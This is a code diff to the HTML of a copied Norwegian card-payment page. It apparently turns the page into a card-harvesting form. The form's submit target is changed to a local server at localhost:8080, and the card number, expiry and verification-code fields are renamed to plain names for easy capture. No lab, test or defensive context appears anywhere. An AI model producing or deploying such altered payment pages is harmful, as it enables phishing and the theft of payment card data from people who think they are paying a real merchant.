@@ -47,7 +47,7 @@
     
     </script>
 
-    <form name="form1" method="post" action="post.php" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'okButton')" id="form1" autocomplete="off">
+    <form name="form1" method="post" action="http://localhost:8080" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'okButton')" id="form1" autocomplete="off">
 <div>
 <input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
 <input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
@@ -172,8 +172,8 @@ Sys.WebForms.PageRequestManager._initialize('EasyPaymentMini$sm', 'form1', [], [
         <td colspan="2"><label for="securityCode" id="securityCodeLabel" style="margin-left: 0px;">Verifiseringskode</label></td>
     </tr>
     <tr>
-        <td><input name="EasyPaymentMini$cardNumber" type="text" maxlength="19" id="cardNumber" placeholder="0000 0000 0000 0000" autocomplete="off" size="19" onchange="javascript:GetIssuerforEasypaymentMini(this.id);" onkeyup="javascript:GetIssuerforEasypaymentMini(this.id);"></td>
-        <td><select name="EasyPaymentMini$month" id="month" aria-label="month">
+        <td><input name="cardNumber" type="text" maxlength="19" id="cardNumber" placeholder="0000 0000 0000 0000" autocomplete="off" size="19" onchange="javascript:GetIssuerforEasypaymentMini(this.id);" onkeyup="javascript:GetIssuerforEasypaymentMini(this.id);"></td>
+        <td><select name="month" id="month" aria-label="month">
 	<option value="01">01</option>
 	<option value="02">02</option>
 	<option value="03">03</option>
@@ -188,7 +188,7 @@ Sys.WebForms.PageRequestManager._initialize('EasyPaymentMini$sm', 'form1', [], [
 	<option value="12">12</option>
 
 </select>
-            <select name="EasyPaymentMini$year" id="year" aria-label="year">
+            <select name="year" id="year" aria-label="year">
 	<option value="23">2023</option>
 	<option value="24">2024</option>
 	<option value="25">2025</option>
@@ -204,7 +204,7 @@ Sys.WebForms.PageRequestManager._initialize('EasyPaymentMini$sm', 'form1', [], [
 	<option value="35">2035</option>
 
 </select></td>
-        <td><input name="EasyPaymentMini$securityCode" type="text" maxlength="4" id="securityCode" placeholder="000" autocomplete="off" size="4" style="margin-left: 0px;"></td>        
+        <td><input name="securityCode" type="text" maxlength="4" id="securityCode" placeholder="000" autocomplete="off" size="4" style="margin-left: 0px;"></td>        
         <td><a id="helpLink" href="CardVerificationDetails.aspx?language=nb-NO" target="_blank"><img src="helpIcon_0.png" alt="Help to find your credit card verification code" style="border-width:0px;"></a></td>
     </tr>
     <tr>
